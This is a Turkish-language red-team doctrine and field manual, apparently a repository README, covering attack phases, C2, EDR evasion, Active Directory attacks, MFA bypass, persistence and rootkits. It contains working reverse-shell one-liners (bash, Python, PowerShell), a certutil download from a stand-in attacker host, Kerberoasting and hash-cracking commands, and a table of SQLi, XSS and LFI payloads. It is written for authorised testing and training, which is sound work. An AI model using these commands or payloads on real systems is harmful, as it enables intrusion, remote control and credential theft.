# 🔴 KIZIL KİTAP: Taarruz Doktrini (The Red Book)

> "Sistemlerin en zayıf halkası kod değil, o kodu yazan ve yöneten insandır. Biz zinciri değil, zihniyetleri kırarız."

---

## ⚔️ Metodoloji: Saldırı Yaşam Döngüsü

Kırmızı Takım operasyonlarımız, **Cyber Kill Chain** ve **MITRE ATT&CK** çerçevelerine sıkı sıkıya bağlıdır. Ancak biz sadece adımları takip etmeyiz; kaosu yönetiriz.

### 1. Keşif ve İstihbarat (Reconnaissance)
*Savaş başlamadan kazanılır.*
- **Pasif Keşif**: Hedefe dokunmadan bilgi toplama. `Whois`, `DNS Dumpster`, `Shodan`, `TheHarvester`.
- **Aktif Keşif**: Hedef sistemlerle doğrudan etkileşim. Port taramaları, banner grabbing. `Nmap`, `Masscan`.

### 2. Silahlandırma (Weaponization)
*Dijital mühimmatın hazırlanması.*
- Payload oluşturma: `Msfvenom`, `Veil Framework`.
- Exploit modifikasyonu: Public exploitleri (Exploit-DB) hedefe özel hale getirme.
- C2 (Komuta Kontrol) Altyapısı: `Cobalt Strike` veya özel Python listener'lar hazırlama.

### 3. İletim ve Sömürü (Delivery & Exploitation)
*Kapıyı kırmak.*
- **Phishing**: Sosyal mühendislik ile zararlı dosya gönderimi.
- **Web Zafiyetleri**: SQLi, XSS, RCE üzerinden sisteme sızma.
- **Ağ Zafiyetleri**: Yama eksikliklerinden (EternalBlue vb.) faydalanma.

### 4. Kurulum ve Kalıcılık (Installation & Persistence)
*Sessizce yerleşmek.*
- Registry anahtarları, Scheduled Task'lar veya Cron job'lar ile yeniden başlatma sonrası erişimi koruma.
- **Rootkit** kullanımı (Gerekirse).

### 5. Yanal Hareket (Lateral Movement) & Domain Dominance
*Kalede gezinmek.*
- `Mimikatz` ile parola hash'lerini (Pass-the-Hash) veya biletleri (Pass-the-Ticket) çalma.
- **BloodHound**: Active Directory içindeki gizli ilişkileri ve yetki yükseltme yollarını görselleştirme.
- **Golden Ticket**: Krbtgt hash'ini çalarak domain üzerinde sınırsız yetki ve kalıcılık sağlayan sahte TGT oluşturma.

---

## 🏗️ Gelişmiş Altyapı: Command & Control (C2)

Profesyonel bir operasyon, sadece bir reverse shell değil, sağlam bir altyapı gerektirir.

### 1. C2 Mimari Tasarımı
- **Redirectors (Yönlendiriciler)**: Ana C2 sunucusunu gizlemek için önüne konulan (genellikle Nginx veya Socat ile) ara sunucular.
- **Domain Fronting**: Trafiği güvenilir bir CDN (örn: Azure, Cloudflare) arkasına saklayarak firewall engellerini aşma.

### 2. EDR Evasion (Tespit Atlatma)
Modern antivirüs ve EDR (Endpoint Detection and Response) sistemlerini aşma teknikleri.
- **API Unhooking**: EDR'ın Windows API'leri üzerine koyduğu "kancaları" (hooks) bypass ederek doğrudan Kernel seviyesinde işlem yapma.
- **Direct Syscalls**: Standart API'leri kullanmak yerine doğrudan System Call kullanarak EDR izlemesinden kaçma.
- **In-Memory Execution**: Dosyayı diske yazmadan doğrudan RAM üzerinde çalıştırma (Reflective DLL Injection).

---

## 🧰 Kızıl Arsenal (Araç Seti)

| Araç | Kategori | Kullanım Amacı |
| :--- | :--- | :--- |
| **Kali Linux** | İşletim Sistemi | Saldırı platformu. |
| **Metasploit** | Framework | Exploit geliştirme ve çalıştırma. |
| **Burp Suite** | Web | Proxy ve Web zafiyet analizi. |
| **Nmap** | Ağ | Port tarama ve servis tespiti. |
| **Hydra** | Brute Force | Parola kırma saldırıları. |
| **John the Ripper** | Kripto | Hash kırma. |
| **SQLMap** | Veritabanı | Otomatik SQL Enjeksiyonu. |

---

## ⚠️ Angajman Kuralları (Rules of Engagement)

1. **İzin Almadan Asla**: Yazılı yetki (Scope Belgesi) olmadan hiçbir sisteme saldırılmaz.
2. **Zarar Verme**: Veri bütünlüğünü bozacak eylemlerden (DROP TABLE gibi) kaçınılır.
3. **Raporla**: Bulunan her zafiyet, kanıtlarıyla (PoC) birlikte raporlanır.


---

## 💻 Sentinel Recon (Araç Kullanımı)

Bu repo içerisinde, keşif aşaması için geliştirdiğimiz özel bir Port Tarayıcı bulunur.

**Konum**: `TOOLS/sentinel_recon.py`

**Kullanım**:
```bash
python3 TOOLS/sentinel_recon.py <HEDEF_IP>
```
*Bu araç sadece TCP bağlantılarını test eder ve banner bilgisi çekmeye çalışır.*

---

## 📕 RTFM: Red Team Field Manual (Saha Notları)

Saha operasyonlarında hız hayat kurtarır. Sık kullanılan komutlar ve teknikler için hızlı referans.

### 🛡️ Nmap Cheat Sheet
| Komut | Açıklama |
| :--- | :--- |
| `nmap -sS -T4 -p- <IP>` | **Gizli (SYN) Tarama**: En sık kullanılan, hızlı tarama. |
| `nmap -sV -sC -O <IP>` | **Tam Analiz**: Versiyon, varsayılan scriptler ve OS tespiti. |
| `nmap -sU --top-ports 100 <IP>` | **UDP Taraması**: En popüler 100 UDP portu. |
| `nmap -f -D RND:10 <IP>` | **Firewall Atlatma**: Paketleri parçalar ve sahte IP'ler kullanır. |
| `nmap --script vuln <IP>` | **Zafiyet Taraması**: Bilinen zafiyetleri NSE scriptleri ile arar. |

### 🏹 Metasploit (MSF) Konsolu
- **Modül Arama**: `search type:exploit platform:windows <terim>`
- **Modül Seçme**: `use <modül_numarası_veya_yolu>`
- **Gereksinimleri Listeleme**: `show options`
- **Payload Oluşturma**: `set PAYLOAD <payload_yolu>` (örn: `windows/x64/meterpreter/reverse_tcp`)
- **İşleyici (Listener) Başlatma**: `use exploit/multi/handler`

### 🐚 Reverse Shell One-Liners (Ters Bağlantı)
Hedef makineden kendi makinenize (Attacker IP: `10.0.0.1`, Port: `4444`) bağlantı açmak için:

**Bash (Linux)**:
```bash
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
```

**Python**:
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

**PowerShell (Windows)**:
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

### 🗝️ Yetki Yükseltme (Privilege Escalation) Kontrol Listesi
- [ ] **Kernel Versiyonu**: `uname -a` / `systeminfo` (Kernel exploit var mı?)
- [ ] **SUID/Sudo**: `sudo -l` (Şifresiz root yetkisi var mı?)
- [ ] **Hizmetler**: Çalışan servisler root/system yetkisiyle mi çalışıyor?
- [ ] **Cron/Tasks**: Yazılabilir bir cron job dosyası var mı?

---

## 🏴‍☠️ Gelişmiş Taktikler: Active Directory & Web

Kurumsal ağların kalbine giden yol.

### 🏢 Active Directory Saldırıları
Domain Controller (DC) ele geçirme teknikleri.

#### 1. Kerberoasting (Kullanıcı Hash Avı)
SPN (Service Principal Name) atanmış servis hesaplarının hashlerini çeker.
```powershell
# PowerView ile
Get-NetUser -SPN
# Rubeus ile
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Hashcat ile Kırma (Mod 13100)
hashcat -m 13100 hashes.kerberoast wordlist.txt
```

#### 2. AS-REP Roasting (Pre-Auth Zafiyeti)
"Do not require Kerberos preauthentication" işaretli kullanıcıları avlar.
```powershell
# Rubeus ile
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast
# Hashcat ile Kırma (Mod 18200)
hashcat -m 18200 hashes.asreproast wordlist.txt
```

---

## ⚡ İleri Seviye Atak Geliştirme: Exploit Development

Kodun içindeki mantıksal hatalardan ziyade, işlemci ve bellek seviyesindeki zafiyetlere odaklanın.

### 1. Bellek Yolsuzluğu (Memory Corruption)
- **Stack Buffer Overflow**: Gereğinden fazla veri göndererek yığında (stack) bulunan `Return Address`'i ezmek ve kontrol akışını ele geçirmek.
- **Heap Overflow**: Dinamik bellek alanında (heap) bulunan veri yapılarını bozarak rastgele kod çalıştırma.

### 2. Modern Bellek Korumaları & Bypass
- **DEP/NX (Data Execution Prevention)**: Belleğin veri yazılan kısımlarının çalıştırılmasını engeller.
  - *Bypass*: **ROP (Return Oriented Programming)** - Sistemdeki mevcut güvenilir kod parçalarını (gadgets) birleştirerek yeni bir fonksiyon oluşturma.
- **ASLR (Address Space Layout Randomization)**: Uygulamanın bellekteki adreslerini her seferinde değiştirir.
  - *Bypass*: **Memory Leak** zafiyetlerini kullanarak bir baz adresi sızdırmak ve diğer adresleri hesaplamak.

### 3. Kabuk Kodlama (Shellcoding)
Zafiyet tetiklendikten sonra çalıştırılacak olan, genellikle "şifreli" veya "polimorfik" ham işlemci komutları (OpCodes).

---

## 🔑 Modern Kimlik Doğrulama Atlatma (MFA Bypass)

Statik parolalar artık tek başına yeterli değil, ancak MFA da bükülemez değildir.

### 1. Adversary-in-the-Middle (AiTM)
Saldırganın, kurban ile gerçek login sayfası arasına girmesi.
- **Session Hijacking**: Parolayı değil, login sonrası tarayıcıya set edilen `Session Cookie`'sini çalmak. Bu sayede MFA çoktan geçilmiş olur.
- **Araçlar**: `Evilginx2`, `Mevil`.

### 2. MFA Yorgunluğu (Push Exhaustion)
Kurbanın telefonuna üst üste onlarca onay isteği göndererek, kazaen veya bıkkınlıkla "Onayla" demesini sağlama tekniği.

### 3. Bulut Token Manipülasyonu (Token Theft)
Sistemde sızan veya bellekte kalan Bulut (Azure/AWS) erişim token'larını çalmak.
- **Geçiş**: `PRT (Primary Refresh Token)` çalınarak Microsoft Entra ID (Azure AD) üzerinde MFA istemeden oturum açılabilir.

---

## ☣️ İleri Seviye Kalıcılık (Persistence)

Bir sisteme sızmak zordur, ancak orada tespit edilmeden kalmak daha zordur.

### 1. WMI Event Subscriptions
WMI (Windows Management Instrumentation) kullanarak sistemsel tetikleyicilere (örn: bilgisayarın açılması, belirli bir prosesin başlaması) kod bağlama.
- **Stealth**: Dosyasız (fileless) bir yöntemdir, kayıt defterinde veya diskte bir `.exe` gerektirmez.

### 2. COM Hijacking
Sistemin kullandığı Component Object Model (COM) anahtarlarını, kendi zararlı DLL veya executable dosyamıza yönlendirmek.
- **Uygulama**: `CLSID` anahtarlarını manipüle ederek meşru bir uygulama çalıştığında saldırganın kodunun da çalışmasını sağlama.

### 3. AD Delegation Atakları (Yetki Devri)
Active Directory ortamında bir servis hesabının, başka bir kullanıcı adına işlem yapabilme yetkisinin suistimal edilmesi.
- **Unconstrained Delegation**: Servis hesabının, ona bağlanan her kullanıcının `TGT`'sini belleğe kaydetmesi (En tehlikelisi).
- **Constrained Delegation**: Sadece belirli servislere yetki devri.
- **RBCD (Resource-Based Constrained Delegation)**: Hedef bilgisayar üzerinde kimlerin yetki devri yapabileceğini saldırganın belirlemesi (Yetki yükseltme için kritik).

---

## 🎯 Gelişmiş Operasyonlar: Adversary Emulation

Saldırganları sadece taklit etmeyin, onları otomatikleştirin.

### 1. Atomic Red Team (ART)
MITRE ATT&CK matrisindeki teknikleri hızlıca test etmek için kullanılan küçük ve modüler testler.
- **Kullanım**: `Invoke-AtomicTest T1003` (LSA Secrets dökümü testi).
- **Amaç**: Mavi takımın tespit mekanizmalarını doğrulamak.

### 2. LotL (Living off the Land) - Yerleşik Silahlar
Saldırganın sistemde hazır bulunan, "güvenilir" araçları kendi amaçları için kullanması.
- **LOLBAS (Windows)**: `Certutil.exe` kullanarak dosya indirmek veya `Mshta.exe` ile script çalıştırmak.
  - *Örnek*: `certutil -urlcache -f http://atacker.com/mal.exe out.exe`
- **GTFOBins (Linux)**: `Nmap` veya `Find` gibi root yetkisiyle çalışan araçlar üzerinden kabuk (shell) almak.
  - *Örnek*: `find . -exec /bin/sh -p \; -quit`

---

## 🚪 İleri Seviye Fiziksel Erişim (Physical Red Teaming)

En güçlü güvenlik duvarı bile, saldırgan fiziksel olarak odaya girdiğinde anlamsızlaşabilir.

### 1. RFID & NFC Klonlama (Proxmark3)
Bina giriş kartlarının ve personel yaka kartlarının kopyalanması.
- **Proxmark3**: LF (125kHz) ve HF (13.56MHz) kartları okuma, simüle etme ve klonlama için kullanılan endüstri standardı araç.
- **Saldırı**: Yakın mesafeden (skimming) bir personelin kart verisini çekip boş bir karta yazmak.

### 2. BadUSB & HID Atakları (Rubber Ducky)
Bilgisayarın "klavye" olarak tanıdığı, takıldığı anda saniyeler içinde önceden programlanmış komutları koşturan cihazlar.
- **Payload**: `DuckyScript` kullanılarak şifrelerin çalınması veya sistemde arka kapı açılması.

### 3. Fiziksel Atlatma (Physical Bypass)
- **Lockpicking**: Kilit açma teknikleri ve kilitlerin zayıf yönlerinin analizi.

---

## 🦾 Çekirdek Seviyesi Operasyonlar (Kernel-Mode Offense)

Kullanıcı modundaki (Ring-3) kısıtlamaları aşıp, işletim sisteminin kalbine (Ring-0) iniş.

### 1. Rootkit Teknolojileri & DKOM
**DKOM (Direct Kernel Object Manipulation)**: Çekirdek nesnelerini (örn: `EPROCESS` listesi) doğrudan manipüle ederek bir prosesi işletim sisteminden tamamen saklama.
- **Görünmezlik**: Proses ne Task Manager'da ne de standart API'lar ile görülebilir.

### 2. Driver Manual Mapping
Windows'un **DSE (Driver Signature Enforcement)** korumasını aşmak için, imzalı bir sürücüdeki zafiyeti kullanarak (örn: `BYOVD - Bring Your Own Vulnerable Driver`) belleğe imzasız kod yükleme sanatı.
- **Süreç**: `ntoskrnl.exe` üzerinden kernel adreslerini çözme ve sürücüyü manuel olarak haritalama.

### 3. Kernel Hooking (IRP & IAT/EAT)
- **IRP (I/O Request Packet) Hooking**: Sistemin disk veya ağ ile kurduğu iletişimin arasına girerek veriyi manipüle etme veya saklama.
- **SSDT Hooking**: Sistem çağrılarını (syscalls) izlemek ve değiştirmek için kullanılan klasik ama etkili yöntemler.

---



### 🕸️ OWASP Top 10: Hızlı Payloads

| Zafiyet | Payload Örneği | Amaç |
| :--- | :--- | :--- |
| **SQL Injection** | `' OR 1=1 --` | Login Bypass. |
| **SQL Injection** | `' UNION SELECT 1, @@version --` | Veritabanı versiyonunu çekme. |
| **XSS (Reflected)** | `<script>alert(document.cookie)</script>` | Çerezleri (Session ID) çalma. |
| **XSS (Polyglot)** | `javascript://%250Aalert(1)//"/*\'/*"/*--></Title/</Script/<Image Src=x OnError=alert(1)>` | Filtreleri atlatmak için karmaşık XSS. |
| **LFI (Local File Inclusion)** | `../../../../etc/passwd` | Sistem dosyalarını okuma. |

